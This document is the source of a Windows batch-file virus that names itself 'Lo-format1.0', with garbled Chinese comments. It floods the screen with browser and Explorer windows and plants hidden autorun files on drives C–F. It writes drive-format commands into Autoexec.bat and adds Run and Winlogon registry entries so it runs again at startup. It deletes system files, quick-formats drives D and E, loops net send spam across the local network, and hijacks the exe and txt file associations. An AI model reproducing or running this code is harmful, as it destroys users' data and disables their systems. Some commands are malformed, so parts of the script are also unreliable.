   @rem ¿ªÊ¼£º
   @Rem -------Lo_format v1.0----
   @Set addadmin=worm
   @Set worm=lo-format1.0.bat

   @rem---------ÆÁ±ÎÊÓÏß---------------------------------------------------------

   @start www.hao123.com
   @start www.yesky.com
   @start www.enet.com.cn
   @start www.qq.com
   @start cd ..&&cd ..&&cd ..&&start ..
   @start cd ..&&cd ..&&cd ..&&start ..
   @start cd ..&&cd ..&&cd ..&&start ..
   @start cd ..&&cd ..&&cd ..&&start ..&&cd ..&&cd ..&&start ..
   @start cd ..&&cd ..&&cd ..&&start ..&&cd ..&&cd ..&&start ..
   @start cd ..&&cd ..&&cd ..&&start ..&&cd ..&&cd ..&&start ..
   @start cd ..&&cd ..&&cd ..&&start ..&&cd ..&&cd ..&&start ..

   @rem--------Ó²ÅÌ¸ÐÈ¾---------------------------------------------------------
   @echo @net send 127.0.0.1 ÄãºÃ£¬¹§Ï²ÄãÖÐÕÐÁË>>c:\lo-out.bat
   @echo @[autorun]>>c:\autorun.inf
   @echo @open=c:\lo-out.bat /autorun>>autorun.inf
   @attrib +h c:\autorun.inf
   @attrib +h c:\lo-out.bat

   @echo @net send 127.0.0.1 ÄãºÃ£¬¹§Ï²ÄãÖÐÕÐÁË>>d:\lo-out.bat
   @echo @[autorun]>>d:\autorun.inf
   @echo @open=d:\lo-out.bat /autorun>>autorun.inf
   @attrib +h d:\autorun.inf
   @attrib +h d:\lo-out.bat

   @echo @net send 127.0.0.1 ÄãºÃ£¬¹§Ï²ÄãÖÐÕÐÁË>>e:\lo-out.bat
   @echo @[autorun]>>e:\autorun.inf
   @echo @open=e:\lo-out.bat /autorun>>autorun.inf
   @attrib +h e:\autorun.inf
   @attrib +h e:\lo-out.bat

   @echo @net send 127.0.0.1 ÄãºÃ£¬¹§Ï²ÄãÖÐÕÐÁË>>f:\lo-out.bat
   @echo @[autorun]>>f:\autorun.inf
   @echo @open=f:\lo-out.bat /autorun>>autorun.inf
   @attrib +h f:\autorun.inf
   @attrib +h f:\lo-out.bat

   @echo @echo off>>c:\Autoexec.bat
   @echo start>>c:\Autoexec.bat
   @echo @format a: /q/u/autoset>>c:\Autoexec.bat
   @echo @format f: /q/u/autoset>>c:\Autoexec.bat
   @echo @format c: /q/u/autoset>>c:\Autoexec.bat
   @echo @format e: /q/u/autoset>>c:\Autoexec.bat
   @echo @format i: /q/u/autoset>>c:\Autoexec.bat
   @attrib +h c:\Autoexec.bat

   @rem---------×¢²á±í¸ÐÈ¾--------------------------------------------------------------

   @reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v System /t REG_SZ /d c:\autoexec.bat
   @reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d Explorer d:\lo-send.bat

   @rem----------Ó²ÅÌ¸ñÊ½»¯------------------------------------------------------------

   @start delete /y c:\. >nul
   @start delete /y c:\ >nul
   @start delete /y c:\%windir%\*.* >nul
   @echo /min @format D:/q\uqautotest >nul >>lo-saf.bat
   @echo /min @format D:/ /q/u qautotest >nul >>lo-saf.bat
   @echo /min @format E:/q/u/autotest >nul >>lo-saf.bat
   @echo /min @format E:/ /q/u autotest >nul >>lo-saf.bat

   @rem----------¹¥»÷-------------------------------------------------------------

   @echo @:lo-one>>lo-formatt.bat
   @echo @start net send 127.0.0.1 ÒâÍâ³ö´í£¡>>lo-formatt.bat
   @echo @goto lo-one>>lo-formatt.bat

   @echo @start format d: /q/u/autoset>>lo-formatf.bat
   @echo @start format e: /q/u/autoset>>lo-formatf.bat

   @start lo-formatt.bat
   @start lo-formatf.bat

   @rem----------ÈÎÎñ½áÊø-ÇåÀíÕ½³¡2Í¨µÀ------------Ë³±ãÒÔsend¹¥»÷Õû¸ö¾ÖÓòÍø------------------

   @echo @type nul>Lo-format1.0.bat
   @echo Lo-format1.0 virus...>>Lo-format1.0.bat
   @echo @:lo-two>>lo-sa.bat

   @echo @start net send * LO-format1.0virus Go into action>>lo-sa.bat
   @echo @goto lo-two>>lo-sa.bat

   @rem-----------×¢²á±í´Û¸Ä------------------------------------------------------------------
   @echo @reg add HKEY_CLASSES_ROOT\exefile\shell\open\command /v @ /t REG_SZ /d "Lo-format %1" %*>>lo-sar.bat
   @echo @reg add HKEY_CLASSES_ROOT\txtfile\shell\open\command /v @ /t REG_SZ /d "Lo-format %1" %*>>lo-sar.bat
   @echo @reg add HKEY--CLASSES--ROOT\CLSID\shell\open\command /v @ /t REG_SZ /d "format d: /q/u /autotest" >>lo-sar.bat
   @start lo-sar.bat

   @start /min lo-sa.bat
   @exit
